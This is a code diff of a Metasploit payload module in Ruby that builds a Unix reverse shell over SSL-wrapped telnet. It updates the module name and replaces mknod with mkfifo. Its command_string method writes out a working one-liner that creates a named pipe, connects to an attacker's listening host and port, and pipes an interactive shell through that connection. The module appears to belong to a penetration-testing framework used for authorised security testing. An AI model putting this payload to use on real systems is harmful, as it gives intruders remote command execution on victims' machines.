@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,9 @@ require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -17,7 +19,7 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Unix Command Shell, Reverse TCP SSL (telnet)',
       'Description'   => %q{
-        Creates an interactive shell via mknod and telnet.
+        Creates an interactive shell via mkfifo and telnet.
         This method works on Debian and other systems compiled
         without /dev/tcp support. This module uses the '-z'
         option included on some systems to encrypt using SSL.
@@ -29,7 +31,7 @@ module Metasploit3
       'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::CommandShell,
       'PayloadType'   => 'cmd_bash',
-      'RequiredCmd'   => 'bash-tcp',
+      'RequiredCmd'   => 'telnet',
       'Payload'       =>
         {
           'Offsets' => { },
@@ -51,6 +53,6 @@ module Metasploit3
   #
   def command_string
     pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-    cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+    cmd = "mkfifo #{pipe_name} && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
   end
 end
